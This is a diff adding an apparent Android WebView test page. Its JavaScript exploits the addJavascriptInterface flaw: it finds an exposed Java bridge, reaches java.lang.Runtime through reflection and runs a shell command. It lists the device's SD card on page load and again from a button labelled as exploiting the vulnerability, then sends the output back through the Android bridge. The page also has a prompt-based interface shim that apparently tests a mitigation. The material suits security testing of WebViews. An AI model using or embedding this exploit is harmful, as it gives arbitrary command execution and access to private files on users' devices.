@@ -1,0 +1,83 @@
+<html>
+  <head>
+    <script>
+      var i=0;
+      
+          function getContents(inputStream)
+	{
+		var contents = ""+i;
+		var b = inputStream.read();
+		var i = 1;
+		while(b != -1) {
+			var bString = String.fromCharCode(b);
+			contents += bString;
+			b = inputStream.read();
+		}
+        i=i+1;
+		return contents;
+	}
+      
+       function execute(cmdArgs)
+	 {
+        for (var obj in window) {
+            if ("getClass" in window[obj]) {
+                alert(obj);
+                return  window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+             }
+         }
+	 } 
+
+      
+      var p = execute(["ls","/mnt/sdcard/"]);
+      document.write(getContents(p.getInputStream()));
+
+      function callJS(){
+            alert("Android调用了JS的callJS方法");
+            Android.hello("nihao");
+            var pp = execute(["ls","/mnt/sdcard/"]);
+            var str = getContents(pp.getInputStream())
+            Android.hello(str);
+      }
+
+      function callJS2(){
+            if (typeof(window.MYJSInterface)!='undefined') {
+		         console.log('window.jsInterface_js_interface_name is exist!!');
+		         Android.hello("MYJSInterface is defined");
+		    } else {
+		         window.MYJSInterface = {
+
+			        onButtonClick:function(arg0) {
+				        return prompt('MyApp:'+JSON.stringify({obj:'jsInterface',func:'onButtonClick',args:[arg0]}));
+			        },
+
+			        onImageClick:function(arg0,arg1,arg2) {
+				         prompt('MyApp:'+JSON.stringify({obj:'jsInterface',func:'onImageClick',args:[arg0,arg1,arg2]}));
+			        },
+
+			        hello:function(arg0) {
+			             return prompt('MyApp:'+JSON.stringify({obj:'MYJSInterface',func:'hello',args:[arg0]}));
+			        }
+		         };
+	        }
+      }
+
+      function callJS3(){
+            if (typeof(window.MYJSInterface) == 'undefined') {
+		        console.log('window.jsInterface_js_interface_name is exist!!');
+		        Android.hello("MYJSInterface is undefined");
+		    } else{
+		        MYJSInterface.hello("MYJSInterface execute");
+		    }
+      }
+    </script>
+  </head>
+  <body>
+    Test WebView
+
+    <button type="button" id="button4" onclick="callJS()">利用Android class 2 js 漏洞</button>
+    <hr/>
+    <button type="button" id="button5" onclick="callJS2()">创建引用MYJSInterface</button>
+    <hr/>
+    <button type="button" id="button6" onclick="callJS3()">调用MYJSInterface</button>
+  </body>
+</html>
